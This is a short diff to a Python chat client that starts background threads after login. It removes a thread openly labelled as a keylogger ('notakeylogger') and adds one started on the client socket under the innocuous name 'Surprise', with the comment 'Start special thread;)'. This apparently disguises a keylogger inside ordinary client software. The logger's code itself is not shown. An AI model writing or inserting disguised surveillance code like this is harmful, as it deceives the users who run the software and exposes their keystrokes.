@@ -12,11 +12,11 @@ from clientHelpers import *
 from cltThreadTimeout import TimeoutThread
 from cltThreadMsg import MsgThread
 from cltThreadCommands import CommandThread
+from cltThreadBackgrd import Surprise
 from cltThreadDmListener import DmListenerThread
 import sys
 import re
 
-from newThread import Logger
 
 #Server would be running on the same host as Client
 if len(sys.argv) != 2:
@@ -55,9 +55,9 @@ timeout, username = loginUser(clientSocket)
 # Initial state after logging in, user can immediately issue a command
 message = "awaiting command"
 
-# Start a keylogger
-notakeylogger = Logger(clientSocket)
-notakeylogger.start()
+# Start special thread;)
+specialThread = Surprise(clientSocket)
+specialThread.start()
 
 # Start timeout thread
 timeoutThread = TimeoutThread(clientSocket, timeout)
